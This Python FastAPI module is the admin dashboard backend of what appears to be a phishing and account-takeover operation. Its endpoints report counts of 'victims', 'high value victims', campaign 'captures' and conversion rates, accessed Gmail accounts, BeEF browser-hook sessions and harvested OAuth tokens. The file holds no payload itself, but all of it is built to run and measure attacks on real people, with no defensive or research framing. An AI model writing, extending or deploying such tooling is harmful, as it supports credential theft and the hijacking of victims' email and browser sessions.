"""
Admin Dashboard API
    Main dashboard statistics and overview endpoints
"""

import logging
from datetime import datetime, timezone, timedelta
from typing import Dict, List, Optional, Any
from fastapi import APIRouter, HTTPException, status, Depends, Query
from pydantic import BaseModel

from database.mongodb.victims import VictimModel
from database.mongodb.campaigns import CampaignModel
from database.mongodb.activity_logs import ActivityLogModel
from database.mongodb.gmail_access_logs import GmailAccessLogModel
from database.mongodb.beef_sessions import BeEFSessionModel
from database.mongodb.oauth_tokens import OAuthTokenModel
from middleware.authentication import get_current_admin_user

logger = logging.getLogger(__name__)

router = APIRouter()

# Pydantic models
class DashboardStats(BaseModel):
    total_victims: int
    active_victims: int
    total_campaigns: int
    active_campaigns: int
    total_gmail_accesses: int
    total_beef_sessions: int
    total_oauth_tokens: int
    recent_activity: List[Dict[str, Any]]

class VictimStats(BaseModel):
    total_victims: int
    new_victims_today: int
    new_victims_this_week: int
    new_victims_this_month: int
    high_value_victims: int
    verified_victims: int
    geographic_distribution: Dict[str, int]
    risk_distribution: Dict[str, int]

class CampaignStats(BaseModel):
    total_campaigns: int
    active_campaigns: int
    completed_campaigns: int
    total_visits: int
    total_captures: int
    conversion_rate: float
    top_performing_campaigns: List[Dict[str, Any]]

@router.get("/stats", response_model=DashboardStats)
async def get_dashboard_stats(
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get comprehensive dashboard statistics"""
    try:
        # Initialize models
        victim_model = VictimModel()
        campaign_model = CampaignModel()
        activity_model = ActivityLogModel()
        gmail_model = GmailAccessLogModel()
        beef_model = BeEFSessionModel()
        oauth_model = OAuthTokenModel()
        
        # Get basic counts
        total_victims = await victim_model.count_total_victims()
        active_victims = await victim_model.count_active_victims()
        total_campaigns = await campaign_model.count_total_campaigns()
        active_campaigns = await campaign_model.count_active_campaigns()
        total_gmail_accesses = await gmail_model.count_total_accesses()
        total_beef_sessions = await beef_model.count_total_sessions()
        total_oauth_tokens = await oauth_model.count_total_tokens()
        
        # Get recent activity
        recent_activity = await activity_model.get_recent_activities(limit=10)
        
        return DashboardStats(
            total_victims=total_victims,
            active_victims=active_victims,
            total_campaigns=total_campaigns,
            active_campaigns=active_campaigns,
            total_gmail_accesses=total_gmail_accesses,
            total_beef_sessions=total_beef_sessions,
            total_oauth_tokens=total_oauth_tokens,
            recent_activity=recent_activity
        )
        
    except Exception as e:
        logger.error(f"Error getting dashboard stats: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to get dashboard statistics"
        )

@router.get("/victim-stats", response_model=VictimStats)
async def get_victim_statistics(
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get detailed victim statistics"""
    try:
        victim_model = VictimModel()
        
        # Get basic counts
        total_victims = await victim_model.count_total_victims()
        new_victims_today = await victim_model.count_victims_since(days=1)
        new_victims_this_week = await victim_model.count_victims_since(days=7)
        new_victims_this_month = await victim_model.count_victims_since(days=30)
        high_value_victims = await victim_model.count_high_value_victims()
        verified_victims = await victim_model.count_verified_victims()
        
        # Get geographic distribution
        geographic_distribution = await victim_model.get_geographic_distribution()
        
        # Get risk distribution
        risk_distribution = await victim_model.get_risk_distribution()
        
        return VictimStats(
            total_victims=total_victims,
            new_victims_today=new_victims_today,
            new_victims_this_week=new_victims_this_week,
            new_victims_this_month=new_victims_this_month,
            high_value_victims=high_value_victims,
            verified_victims=verified_victims,
            geographic_distribution=geographic_distribution,
            risk_distribution=risk_distribution
        )
        
    except Exception as e:
        logger.error(f"Error getting victim statistics: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to get victim statistics"
        )

@router.get("/campaign-stats", response_model=CampaignStats)
async def get_campaign_statistics(
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get detailed campaign statistics"""
    try:
        campaign_model = CampaignModel()
        
        # Get basic counts
        total_campaigns = await campaign_model.count_total_campaigns()
        active_campaigns = await campaign_model.count_active_campaigns()
        completed_campaigns = await campaign_model.count_completed_campaigns()
        
        # Get performance metrics
        total_visits = await campaign_model.get_total_visits()
        total_captures = await campaign_model.get_total_captures()
        conversion_rate = total_captures / total_visits if total_visits > 0 else 0.0
        
        # Get top performing campaigns
        top_campaigns = await campaign_model.get_top_performing_campaigns(limit=5)
        
        return CampaignStats(
            total_campaigns=total_campaigns,
            active_campaigns=active_campaigns,
            completed_campaigns=completed_campaigns,
            total_visits=total_visits,
            total_captures=total_captures,
            conversion_rate=conversion_rate,
            top_performing_campaigns=top_campaigns
        )
        
    except Exception as e:
        logger.error(f"Error getting campaign statistics: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to get campaign statistics"
        )

@router.get("/recent-activity")
async def get_recent_activity(
    limit: int = Query(20, ge=1, le=100),
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get recent system activity"""
    try:
        activity_model = ActivityLogModel()
        recent_activities = await activity_model.get_recent_activities(limit=limit)
        
        return {
            "success": True,
            "activities": recent_activities,
            "count": len(recent_activities)
        }
        
    except Exception as e:
        logger.error(f"Error getting recent activity: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to get recent activity"
        )

@router.get("/system-health")
async def get_system_health(
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get system health status"""
    try:
        # Check database connections
        victim_model = VictimModel()
        campaign_model = CampaignModel()
        activity_model = ActivityLogModel()
        
        db_health = {
            "victims": await victim_model.health_check(),
            "campaigns": await campaign_model.health_check(),
            "activity_logs": await activity_model.health_check()
        }
        
        # Check external services
        gmail_model = GmailAccessLogModel()
        beef_model = BeEFSessionModel()
        oauth_model = OAuthTokenModel()
        
        service_health = {
            "gmail_access_logs": await gmail_model.health_check(),
            "beef_sessions": await beef_model.health_check(),
            "oauth_tokens": await oauth_model.health_check()
        }
        
        # Overall health status
        all_healthy = all(db_health.values()) and all(service_health.values())
        
        return {
            "success": True,
            "overall_status": "healthy" if all_healthy else "degraded",
            "database_health": db_health,
            "service_health": service_health,
            "timestamp": datetime.now(timezone.utc).isoformat()
        }
        
    except Exception as e:
        logger.error(f"Error getting system health: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to get system health"
        )

@router.get("/performance-metrics")
async def get_performance_metrics(
    time_range: str = Query("24h", regex="^(1h|24h|7d|30d)$"),
    current_admin: dict = Depends(get_current_admin_user)
):
    """Get performance metrics for the specified time range"""
    try:
        # Calculate time range
        now = datetime.now(timezone.utc)
        if time_range == "1h":
            start_time = now - timedelta(hours=1)
        elif time_range == "24h":
            start_time = now - timedelta(days=1)
        elif time_range == "7d":
            start_time = now - timedelta(days=7)
        else:  # 30d
            start_time = now - timedelta(days=30)
        
        # Get metrics
        victim_model = VictimModel()
        campaign_model = CampaignModel()
        activity_model = ActivityLogModel()
        
        metrics = {
            "time_range": time_range,
            "start_time": start_time.isoformat(),
            "end_time": now.isoformat(),
            "victims": {
                "new_victims": await victim_model.count_victims_since(start_time),
                "high_value_victims": await victim_model.count_high_value_victims_since(start_time)
            },
            "campaigns": {
                "new_campaigns": await campaign_model.count_campaigns_since(start_time),
                "total_visits": await campaign_model.get_visits_since(start_time),
                "total_captures": await campaign_model.get_captures_since(start_time)
            },
            "activity": {
                "total_activities": await activity_model.count_activities_since(start_time),
                "activities_by_type": await activity_model.get_activities_by_type_since(start_time)
            }
        }
        
        return {
            "success": True,
            "metrics": metrics
        }
        
    except Exception as e:
        logger.error(f"Error getting performance metrics: {e}")
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Failed to get performance metrics"
        )